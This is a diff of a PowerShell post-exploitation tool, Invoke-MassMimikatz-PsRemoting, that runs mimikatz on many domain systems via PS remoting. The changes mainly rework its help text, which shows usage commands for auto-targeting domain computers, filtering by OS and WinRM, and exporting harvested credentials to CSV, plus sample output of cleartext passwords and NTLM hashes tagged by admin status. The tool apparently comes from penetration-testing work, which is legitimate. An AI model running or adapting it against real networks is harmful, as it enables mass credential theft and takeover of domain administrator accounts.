@@ -1,112 +1,127 @@
 <#
+	    .SYNOPSIS
+	       This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
 
-Script mod author
-    Scott Sutherland (@_nullbind), 2015 NetSPI
+	    .DESCRIPTION
+	       This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
+	       It supports auto-targeting of domain systems, filtering systems by os/winrm, and limiting the number of systems to 
+	       run mimikatz on.  It returns the list of credentials to the pipeline so they can be used by other cmdlets that includes
+	       domain, username, password type, password, if user is a domain admin, and if user is an enterprise admin.      
 
-Description
-    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.  
-    It supports auto-targeting of domain systems, filtering systems by os/winrm, and limiting the number of systems to 
-    run mimikatz on.  Finally, it returns the list of credentials to the pipeline so they can be used by other cmdlets. 
-	 
-Notes
-    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
-    Returns data table object to pipeline with creds. Weee PowerShell.
-    
-    Features/credits:
-	 - Input: Accepts host from pipeline (will's code)
-	 - Input: Accepts host list from file (will's code)
-	 - AutoTarget option will lookup domain computers from DC (carlos/scott code)
-	 - Ability to filter by OS (scott's code)
-	 - Ability to only target domain systems with WinRm installed (via SPNs) (scott's code)
-	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
-     - enterprise and domain admin lookup (scotts code)
-	 - More descriptive verbose error messages (scott's code)
-	 - Ability to specify alternative credentials and query dc from non-domain system (carlos/will's code)
-	 - Run mimikatz on target system (chris's, Joseph's, Matt's, and benjamin's code)
-	 - Parse mimikatz output (will's code)
-	 - Returns enumerated credentials in a data table which can be used in the pipeline (scott's code)
+	    .EXAMPLE
+	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
 
-Command Examples
+	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 
+	       
+	    .EXAMPLE
+	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
+	       Also, filter for systems with wmi enabled that are running Server 2012.
 
-    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
-    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5
+	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm
+		       
+	    .EXAMPLE
+	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
+	       Also, filter for systems with wmi enabled that are running Server 2012 and specify a file containing a list of systems.
 
-    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
-    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm
+	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt
 
-    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
-    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt
+	    .EXAMPLE
+	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
+	       Also, filter for systems with wmi enabled that are running Server 2012. Also, include an additional target using hosts parameter.
 
-    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
-    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”
+	       PS C:\> Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –Hosts “10.1.1.1”
 
-     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
-    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!'
+	    .EXAMPLE
+	       Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
+	       Also, filter for systems with wmi enabled that are running Server 2012. Also, include an additional target using pipeline.
 
-    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
-    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1 
+	       PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm 
 
-    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
-    Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget –MaxHost 5 
+ 	    .EXAMPLE
+	       Run command from non-domain system using alternative credentials. Target 10.1.1.1.
 
-    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
-    Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget –MaxHost 5  | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
+	       PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' | ft -AutoSize 
 
-Output Sample 1
+	            VERBOSE: Getting list of Servers from provided hosts...
+	            VERBOSE: Found 1 servers that met search criteria.
+	            VERBOSE: Attempting to create 1 ps sessions...
+	            VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
+	            VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
+	            VERBOSE: Removing ps sessions...
+	
+	            Type      Domain      Username      Password                         EnterpriseAdmin DomainAdmin
+	            ----      ------      --------      --------                         --------------- -----------
+	            ntlm hash test        administrator 48114a647011bd6ae5bd2af865aa498f Unknown         Unknown        
+	            cleartext test        administrator MyEAPassword!                    Unknown         Unknown        
+	            cleartext test.domain administrator MyEAPassword!                    Unknown         Unknown        
+	            cleartext test        myadmin       MyDAPassword!                    Unknown         Unknown        
+	            cleartext test.domain myadmin       MyDAPassword!                    Unknown         Unknown        
+	            ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 Unknown         Unknown 
+	            cleartext test        myadmin       MyUserPassword!                  Unknown         Unknown        
+	            cleartext test.domain myadmin       MyUSerPassword!                  Unknown         Unknown        
+	            ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 Unknown         Unknown 
 
-    PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' | ft -AutoSize
-    VERBOSE: Getting list of Servers from provided hosts...
-    VERBOSE: Found 1 servers that met search criteria.
-    VERBOSE: Attempting to create 1 ps sessions...
-    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
-    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
-    VERBOSE: Removing ps sessions...
+ 	    .EXAMPLE
+	       Run command from non-domain system using alternative credentials. Target 10.1.1.1.
+	       Authenticate to the DC at 10.2.2.1 to determine if users are admins.
 
-    Type      Domain      Username      Password                         EnterpriseAdmin DomainAdmin
-    ----      ------      --------      --------                         --------------- -----------
-    ntlm hash test        administrator 48114a647011bd6ae5bd2af865aa498f Unknown         Unknown        
-    cleartext test        administrator MyEAPassword!                    Unknown         Unknown        
-    cleartext test.domain administrator MyEAPassword!                    Unknown         Unknown        
-    cleartext test        myadmin       MyDAPassword!                    Unknown         Unknown        
-    cleartext test.domain myadmin       MyDAPassword!                    Unknown         Unknown        
-    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 Unknown         Unknown 
-    cleartext test        myadmin       MyUserPassword!                  Unknown         Unknown        
-    cleartext test.domain myadmin       MyUSerPassword!                  Unknown         Unknown        
-    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 Unknown         Unknown            
+	       PS C:\>  “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget | ft -AutoSize
 
-Output Sample 2
+	            VERBOSE: Getting list of Servers from provided hosts...
+	            VERBOSE: Getting list of Servers from DC...
+	            VERBOSE: Found 3 servers that met search criteria.
+	            VERBOSE: Getting list of Enterprise and Domain Admins...
+	            VERBOSE: Attempting to create 3 ps sessions...
+	            VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
+	            VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
+	            VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
+	            VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
+	            VERBOSE: Removing ps sessions...
+	
+	            Type      Domain      Username      Password                         EnterpriseAdmin DomainAdmin
+	            ----      ------      --------      --------                         --------------- -----------
+	            ntlm hash test        administrator 48114a647011bd6ae5bd2af865aa498f Yes             Yes        
+	            cleartext test        administrator MyEAPassword!                    Yes             Yes        
+	            cleartext test.domain administrator MyEAPassword!                    Yes             Yes        
+	            cleartext test        myadmin       MyDAPassword!                    No              Yes        
+	            cleartext test.domain myadmin       MyDAPassword!                    No              Yes        
+	            ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              Yes 
+	            cleartext test        myadmin       MyUserPassword!                  No              No        
+	            cleartext test.domain myadmin       MyUSerPassword!                  No              No        
+	            ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              No   
 
-PS C:\> “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
-    VERBOSE: Getting list of Servers from provided hosts...
-    VERBOSE: Getting list of Servers from DC...
-    VERBOSE: Found 3 servers that met search criteria.
-    VERBOSE: Getting list of Enterprise and Domain Admins...
-    VERBOSE: Attempting to create 3 ps sessions...
-    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
-    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
-    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
-    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
-    VERBOSE: Removing ps sessions...
+ 	    .EXAMPLE
+	       Run command from non-domain system using alternative credentials. Target 10.1.1.1.
+	       Authenticate to the DC at 10.2.2.1 to determine if users are admins, and only pull passwords from one system.
+	       Then export to a file.
 
-    Type      Domain      Username      Password                         EnterpriseAdmin DomainAdmin
-    ----      ------      --------      --------                         --------------- -----------
-    ntlm hash test        administrator 48114a647011bd6ae5bd2af865aa498f Yes             Yes        
-    cleartext test        administrator MyEAPassword!                    Yes             Yes        
-    cleartext test.domain administrator MyEAPassword!                    Yes             Yes        
-    cleartext test        myadmin       MyDAPassword!                    No              Yes        
-    cleartext test.domain myadmin       MyDAPassword!                    No              Yes        
-    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              Yes 
-    cleartext test        myadmin       MyUserPassword!                  No              No        
-    cleartext test.domain myadmin       MyUSerPassword!                  No              No        
-    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              No                  
+	       PS C:\>  “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose -username domain\user1 -password 'MyPassword!' –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1 | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
 
-References
-    https://github.com/gentilkiwi/mimikatz
-	https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
-	https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz
-	https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
-	http://blogs.technet.com/b/heyscriptingguy/archive/2009/10/29/hey-scripting-guy-october-29-2009.aspx
-    https://technet.microsoft.com/en-us/library/hh849694.aspx
+	     .NOTES
+	       PSeudo Author/Code Gluer: Scott Sutherland (@_nullbind) - 2015, NetSPI
+	       This is based on work done by Benjamin Delpy, Joseph Bialek, Matt Graeber, Rob Fuller, and Will Schroeder.
+	       Weee PowerShell.
+
+	       Features/credits:
+	       - Input: Accepts host from pipeline (Will's code)
+	       - Input: Accepts host list from file (Will's code)
+	       - AutoTarget option will lookup domain computers from DC (Carlos/Scott's code)
+	       - Option to filter by OS (Scott's code)
+	       - Option to only target domain systems with WinRm installed via SPNs (Scott's code)
+	       - Option to limit number of hosts to run Mimikatz on (Scott's code)
+	       - Support to identify which accounts are enterprise and domain admins (Scotts code)
+	       - Support for alternative credentials / query DC from non-domain system (Carlos/Will's code)
+	       - Support to run Mimikatz on target system (benjamin, Joseph's, and Matt's code)
+	       - Support for parsing Mimikatz output (Will's code)
+	       - Returns enumerated credentials in a data table which can be used in the pipeline (Scott's code)
+
+	     .LINK
+	       https://github.com/gentilkiwi/mimikatz
+	       https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
+	       https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz
+	       https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
+	       http://blogs.technet.com/b/heyscriptingguy/archive/2009/10/29/hey-scripting-guy-october-29-2009.aspx
+	       https://technet.microsoft.com/en-us/library/hh849694.aspx
 #>
 function Invoke-MassMimikatz-PsRemoting
 {
@@ -465,8 +480,8 @@ function Invoke-MassMimikatz-PsRemoting
                 return $TblPasswords_Clean
             }
         }
+        
 
-        # Conduct attack
         Process 
         {
 
@@ -476,8 +491,8 @@ function Invoke-MassMimikatz-PsRemoting
 
             # Get list of systems from the command line / pipeline            
             if ($Hosts)
-            {
-                Write-verbose "Getting list of Servers from provided hosts..."
+            { 
+                 Write-verbose "Getting list of Servers from provided hosts..."
                 $Hosts | 
                 %{ 
                     $TblServers.Rows.Add($_) | Out-Null 
@@ -3382,4 +3397,3 @@ Invoke-Mimikatz -DumpCreds
                 }                
         }
     }
-
